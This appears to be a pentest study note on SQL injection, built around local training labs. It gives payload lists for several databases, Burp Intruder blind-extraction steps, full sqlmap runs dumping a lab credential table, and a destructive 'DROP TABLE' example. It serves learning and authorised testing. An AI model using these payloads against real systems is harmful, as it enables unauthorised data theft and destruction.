#SQL  #BurpeSuite #sqlmap  #substr


# What is it?

SQL injection is where an attacker is able to manipulate database queries made by an application.

**A simple example**

-   A vulnerable web application has the endpoint `/search?product={productName}`
-   When a request is made, the application uses SQL to search for the product `SELECT * FROM products WHERE name=$productName`
-   If an attacker inserts a payload into `{productName}` such as `anything' UNION SELECT password FROM users WHERE username = 'admin` that modifies the query, sensitive data could be leaked.
-   The vulnerable application sends this query to the database and the database returns the admin's password.
    
It's important to note that a payload or attack may change depending on the application, the query, and the database. SQL injection can often lead to:

-   Sensitive data exposure
-   Data manipulation
-   Remote code execution
-   Denial of service
## Exploitation:

```
# Basic login bypass
' AND 1=1#
```

```
# UNION SELECT
' UNION SELECT null,null FROM users-- -
```

```
# Blind
' AND SUBSTR((SELECT version()),1,1)='7'#
CAST((SELECT example_column FROM example_table) AS int)
```

# Detection:

General

```
{payload}--
{payload};--
{payload}#
'||{payload}--
'||{payload}#
"{payload}--
"{payload}#
' AND {payload}--
' OR {payload}--
' AND EXISTS({payload})--
' OR EXISTS({payload})--
```

MySQL

```
' UNION ALL SELECT {payload}--
' UNION SELECT {payload}--
' OR (SELECT {payload}) IS NOT NULL--
' OR (SELECT {payload}) IS NULL--
'||{payload}--
"||{payload}--
'||(SELECT {payload})--
"||(SELECT {payload})--
```

PostgeSQL

```
' UNION ALL SELECT {payload}--
' UNION SELECT {payload}--
' OR (SELECT {payload}) IS NOT NULL--
' OR (SELECT {payload}) IS NULL--
```

Oracle

```
' UNION ALL SELECT {payload} FROM dual--
' UNION SELECT {payload} FROM dual--
' OR (SELECT {payload} FROM dual) IS NOT NULL--
' OR (SELECT {payload} FROM dual) IS NULL--
'||({payload})--
'||{payload}||'--
"||{payload}||"--
'||(SELECT {payload} FROM dual)--
```

MSSQL

```
' UNION ALL SELECT {payload}--
' UNION SELECT {payload}--
' OR (SELECT {payload}) IS NOT NULL--
' OR (SELECT {payload}) IS NULL--
'+{payload}+
"+{payload}+
'+'+(SELECT {payload})+
"+"+(SELECT {payload})+
```

Other Payloads

```
OR {payload}=1
AND {payload}=1
AND IF({payload}, SLEEP(5), 1)
AND CASE WHEN {payload} THEN sleep(5) ELSE NULL END
AND {payload}
AND NOT {payload}
AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT('Error:',{payload},0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```

## Tools:

SQLmap

The easiest way to get started with SQLmap is to either save a request to a file or copy a request as curl and change the curl command to sqlmap.

![](https://appsecexplained.gitbook.io/~gitbook/image?url=https%3A%2F%2F86304134-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F7lI1MQhaUuVEjnryWVD9%252Fuploads%252FpPGpQqWvSFx8k9WKoBYk%252Fsqli-copy-curl.png%3Falt%3Dmedia%26token%3Dd980ee31-b7b2-4b4f-8b52-60851170b5d3&width=768&dpr=4&quality=100&sign=f738660b&sv=1)

*Copying a request as cURL*

```
# Original curl request
curl 'http://localhost/labs/i0x01.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-GB,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://localhost' -H 'Connection: keep-alive' -H 'Referer: http://localhost/labs/i0x01.php' -H 'Cookie: csrf0x02=jeremy' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'username=jeremy'

# Update 'curl' to 'sqlmap' and optionally add sqlmap flags
sqlmap 'http://localhost/labs/i0x01.php' -X POST -H 'User-Agent: Mozilla/
```

### Blind SQL Injection

Blind SQL injection (Blind SQLi) is a type of SQL injection attack where the attacker can exploit the database, but the application does not display the output. Instead, the attacker must "infer" data by sending payloads and observing the application's behavior or responses.

**A simple example:**
- A vulnearble webapp uses an API for its search to return the number of results found.
- A user searches for a product, and the application returns with "X products found" without displaying product details.
- The application uses the SQL query `SELECT COUNT(*) FROM products WHERE product_name LIKE '%{searchTerm}%'`.
- An attacker could exploit this by injecting SQL conditions into the `{searchTerm}`.
- For exmaple, searching for `laptop' AND 1=1-- -` returns "1 product found" and searching for `laptop' AND 1=2-- -` returns "0 products found", this behavior can be an indicator of a potential Blind SQLi vulnerability.

Blind SQLi is more time-consuming than regular SQLi but is just as dangerous. It can lead to:
- Sensitive data exposure
- Data manipulation
- Authentication bypass
- Potential discovery of hidden data

### Stored (Second-order) SQL Injection

Second order SQL injection (also known as Stored SQL Injection) occurs when user input is first stored in the database, and later used without being validated or encoded. The injection opportunity occurs in the second operation, hence the name "second order".

**A simple example:**
- A vulnerable webapp allows users to save their usernames.
- An attacker can provide a malicious payload as their username, e.g. `jeremy'); DROP TABLE users;-- -`
- Later, when the application tries to fetch the username for an operation (e.g., greeting a returning user), it executes the malicious payload.

This type of attack can lead to:
1. Data loss or corruption.
2. Compromise of the database.
3. Sensitive data exposure.
4. Remote code execution.


---

Test for SQL injection by adding `'` and `"` after a query and if there is an error, may be vulnerable.

```
jeremy' or 1=1#
```

or

```
jeremy' 0r 1=1-- -
```
# Union

Can retrieve information from other tables and columns that are not initially defined.

May be hard to determine how many columns so use this technique to determine number of columns returned:

```
jeremy' union select null#
```

```
jeremy' union select null,null#
```

```
jeremy' union select null,null,null#
```

Now can query version of database:

```
jeremy' union select null,null,version()#
```

Query tables in database:

```
jeremy' union select null,null,table_name from information_schema.tables#
```

Query columns in database:

```
jeremy' union select null,null,column_name from information_schema.columns#
```

Now we can select jeremy's password:

```
jeremy' union select null,null,password from injection0x01#
```

Data in column may be integers (null would return errors) and may need to be specified as followed:

```
jeremy' union select null(int),1,null,password from injection0x01#
```

https://portswigger.net/web-security/sql-injection/cheat-sheet



# SQL Injection Manual Attack Path:

Manually try to find tables in search boxes:
```
EXAMPLE' union select null,null,null,table_name from information_schema.tables#
```

Then use table name for users to find users:
```
EXAMPLE' union select null,null,null,EXAMPLE_USERS_COLUMN from EXAMPLE_USERS_TABLE#
```

Then grab password:
```
EXAMPLE' union select null,null,null,EXAMPLE_PASSWORD_COLUMN from EXAMPLE_USERS_TABLE#
```

... Or, use #sqlmap as it is OP and can find all tables and creds...


# Blind SQL Injections
**(sqlmap is great)**

Login to Injection0x02 as `jeremy:jeremy`

Note:
- cookie/session
- content length
- etc...

edit in Repeater `jeremy' or 1=1` and URL encoded it with `CTRL+U`

Automate this attack with #sqlmap
1. copy Request from Burp, save to txt file
2. run `sqlmap -r req.txt`

```
└─(12:09:16)──> sqlmap -r req.txt                                                                                  ──(Wed,Aug28)─┘
        ___
       __H__                                                                                                                       
 ___ ___["]_____ ___ ___  {1.8.6.3#dev}                                                                                            
|_ -| . [(]     | .'| . |                                                                                                          
|___|_  [']_|_|_|__,|  _|                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:09:25 /2024-08-28/

[12:09:25] [INFO] parsing HTTP request from 'req.txt'
[12:09:25] [INFO] testing connection to the target URL
[12:09:25] [INFO] checking if the target is protected by some kind of WAF/IPS
[12:09:25] [INFO] testing if the target URL content is stable
[12:09:25] [INFO] target URL content is stable
[12:09:25] [INFO] testing if POST parameter 'username' is dynamic
[12:09:25] [WARNING] POST parameter 'username' does not appear to be dynamic
[12:09:25] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[12:09:25] [INFO] testing for SQL injection on POST parameter 'username'
[12:09:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:09:25] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:09:25] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:09:25] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:09:25] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[12:09:26] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[12:09:26] [INFO] testing 'Generic inline queries'
[12:09:26] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:09:26] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[12:09:26] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[12:09:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:09:26] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[12:09:26] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[12:09:26] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
[12:09:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:09:48] [WARNING] POST parameter 'username' does not seem to be injectable
[12:09:48] [INFO] testing if POST parameter 'password' is dynamic
[12:09:48] [WARNING] POST parameter 'password' does not appear to be dynamic
[12:09:48] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[12:09:48] [INFO] testing for SQL injection on POST parameter 'password'
[12:09:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:09:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:09:48] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:09:48] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:09:48] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[12:09:48] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[12:09:48] [INFO] testing 'Generic inline queries'
[12:09:48] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:09:48] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[12:09:48] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[12:09:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:09:48] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[12:09:48] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[12:09:48] [INFO] testing 'Oracle AND time-based blind'
[12:09:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:09:48] [WARNING] POST parameter 'password' does not seem to be injectable
[12:09:48] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 12:09:48 /2024-08-28/
```

Password does not seem injectable.

We can try the session cookie then.

1. Send request with cookie to repeater from http history
2. Try adding to session cookie `' and 1=1#`
3. If content length is the same, SQL injection vulnerability


Construct a query that gets character by character from database (Blind SQL Injection - change in behavior gives us data/confirmation), then dump data from table using SQL Map.

Intruder method:
1. Send request with cookie to repeater from http history
2. Try adding to session cookie `' and substring((select version()), 1, 1) = '8'#`
3. If content length is the same, tells us the version of SQL is version 8
4. Try adding to session cookie `' and substring((select version()), 1, 5) = '8.0.3'#`
5. If content length is the same, tells us the version of SQL is version 8.0.3
6. Try adding to session cookie `' and substring((select password from injection0x02 where username = 'jessamy'), 1, 1) = 'a'#` and send this request to Intruder
7. Use Sniper
8. Add payload marker to `a` so it is `§a§`
9. Go to Payloads tab, add a-z and 0-9 to payload settings
	1. can google wordlists or use python to generate lists
10. Start attack
11. Filter results by length (smallest length is success)

SQLMap method:
1. Copy session cookie original request to a txt file and save
2. `sqlmap -r req2.txt --level=2`

```
└─(12:31:51)──> sqlmap -r req2.txt --level=2                                                                 130 ↵ ──(Wed,Aug28)─┘
        ___
       __H__                                                                                                                       
 ___ ___[']_____ ___ ___  {1.8.6.3#dev}                                                                                            
|_ -| . ["]     | .'| . |                                                                                                          
|___|_  [(]_|_|_|__,|  _|                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:32:03 /2024-08-28/

[12:32:03] [INFO] parsing HTTP request from 'req2.txt'
[12:32:03] [INFO] testing connection to the target URL
[12:32:03] [INFO] testing if the target URL content is stable
[12:32:03] [INFO] target URL content is stable
[12:32:03] [INFO] testing if Cookie parameter 'session' is dynamic
do you want to URL encode cookie values (implementation specific)? [Y/n] n
[12:32:11] [INFO] Cookie parameter 'session' appears to be dynamic
[12:32:11] [WARNING] heuristic (basic) test shows that Cookie parameter 'session' might not be injectable
[12:32:11] [INFO] testing for SQL injection on Cookie parameter 'session'
[12:32:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:32:12] [INFO] Cookie parameter 'session' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="your")
[12:32:12] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (1) values? [Y/n] 

[12:32:31] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[12:32:31] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[12:32:31] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[12:32:31] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[12:32:31] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[12:32:31] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[12:32:31] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[12:32:31] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[12:32:31] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:32:31] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:32:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:32:31] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:32:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[12:32:31] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[12:32:31] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:32:31] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[12:32:31] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[12:32:31] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[12:32:31] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[12:32:31] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[12:32:31] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[12:32:31] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[12:32:31] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[12:32:31] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[12:32:31] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[12:32:31] [INFO] testing 'Generic inline queries'
[12:32:31] [INFO] testing 'MySQL inline queries'
[12:32:31] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[12:32:31] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[12:32:31] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[12:32:31] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[12:32:31] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[12:32:31] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[12:32:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:32:41] [INFO] Cookie parameter 'session' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
```

3.  Returns a test payload:

```
Cookie parameter 'session' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

sqlmap identified the following injection point(s) with a total of 285 HTTP(s) requests:
---
Parameter: session (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND 1592=1592 AND 'xPMd'='xPMd

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND (SELECT 1008 FROM (SELECT(SLEEP(5)))hABQ) AND 'YeTn'='YeTn
---
[12:33:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.54, PHP 7.4.33
back-end DBMS: MySQL >= 5.0.12
[12:33:50] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/localhost'

[*] ending @ 12:33:50 /2024-08-28/
```

4. Now we can dump database using, `sqlmap -r req2.txt --level=2 --dump` (returns from every table)
	1. To return from Injection0x02 only, `sqlmap -r req2.txt --level=2 --dump -T injection0x02`
```
└─(12:37:10)──> sqlmap -r req2.txt --level=2 --dump -T injection0x02                                           1 ↵ ──(Wed,Aug28)─┘
        ___
       __H__                                                                                                                       
 ___ ___[,]_____ ___ ___  {1.8.6.3#dev}                                                                                            
|_ -| . [,]     | .'| . |                                                                                                          
|___|_  [']_|_|_|__,|  _|                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:37:27 /2024-08-28/

[12:37:27] [INFO] parsing HTTP request from 'req2.txt'
[12:37:27] [INFO] resuming back-end DBMS 'mysql' 
[12:37:27] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: session (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND 1592=1592 AND 'xPMd'='xPMd

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND (SELECT 1008 FROM (SELECT(SLEEP(5)))hABQ) AND 'YeTn'='YeTn
---
[12:37:27] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.54, PHP 7.4.33
back-end DBMS: MySQL >= 5.0.12
[12:37:27] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[12:37:27] [INFO] fetching current database
[12:37:27] [INFO] resumed: peh-labs
[12:37:27] [INFO] fetching columns for table 'injection0x02' in database 'peh-labs'
[12:37:27] [INFO] resumed: 4
[12:37:27] [INFO] resumed: username
[12:37:27] [INFO] resumed: password
[12:37:27] [INFO] resumed: email
[12:37:27] [INFO] resumed: session
[12:37:27] [INFO] fetching entries for table 'injection0x02' in database 'peh-labs'
[12:37:27] [INFO] fetching number of entries for table 'injection0x02' in database 'peh-labs'
[12:37:27] [INFO] resumed: 2
[12:37:27] [INFO] resumed: 6967cabefd763ac1a1a88e11159957db
[12:37:27] [INFO] resumed: jeremy@example.com
[12:37:27] [INFO] resumed: jeremy
[12:37:27] [INFO] resumed: jeremy
[12:37:27] [INFO] resumed: 9dedc6891e2839a791ed37157f1241fe
[12:37:27] [INFO] resumed: jessamy@example.com
[12:37:27] [INFO] resumed: ZWFzdGVyZWdn
[12:37:27] [INFO] resumed: jessamy
[12:37:27] [INFO] recognized possible password hashes in column '`session`'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: peh-labs
Table: injection0x02
[2 entries]
+---------------------+--------------+----------+----------------------------------+
| email               | password     | username | session                          |
+---------------------+--------------+----------+----------------------------------+
| jeremy@example.com  | jeremy       | jeremy   | 6967cabefd763ac1a1a88e11159957db |
| jessamy@example.com | ZWFzdGVyZWdn | jessamy  | 9dedc6891e2839a791ed37157f1241fe |
+---------------------+--------------+----------+----------------------------------+

[12:37:36] [INFO] table '`peh-labs`.injection0x02' dumped to CSV file '/home/kali/.local/share/sqlmap/output/localhost/dump/peh-labs/injection0x02.csv'                                                                                                               
[12:37:36] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/localhost'

[*] ending @ 12:37:36 /2024-08-28/
```

We now have jeremy and jessamy's passwords!

Try upper and lowercase characters in Intruder also.

For real client, sqlmap should be used cautious as many requests could overload system.